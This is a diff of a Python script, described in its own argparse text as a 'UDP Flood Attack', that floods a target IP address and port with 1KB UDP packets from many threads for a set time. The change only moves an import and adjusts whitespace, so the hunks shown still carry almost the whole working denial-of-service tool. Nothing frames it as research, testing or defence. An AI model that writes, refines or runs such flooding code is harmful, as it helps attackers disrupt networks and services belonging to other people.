@@ -1,15 +1,16 @@
 import socket
 import threading
 import time
+import argparse
 
 def udp_flood(target_ip, target_port, duration):
     start_time = time.time()
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
+    
     while time.time() - start_time < duration:
         message = b"X" * 1024  # 1KB payload
         sock.sendto(message, (target_ip, target_port))
-
+    
     sock.close()
 
 def start_attack(target_ip, target_port, threads, duration):
@@ -18,8 +19,6 @@ def start_attack(target_ip, target_port, threads, duration):
         thread.start()
 
 if __name__ == "__main__":
-    import argparse
-
     parser = argparse.ArgumentParser(description="UDP Flood Attack")
     parser.add_argument("ip", type=str, help="Target IP address")
     parser.add_argument("port", type=int, help="Target port")
@@ -35,3 +34,4 @@ if __name__ == "__main__":
 
     print(f"Starting UDP flood attack on {target_ip}:{target_port} for {duration} seconds with {threads} threads.")
     start_attack(target_ip, target_port, threads, duration)
+    
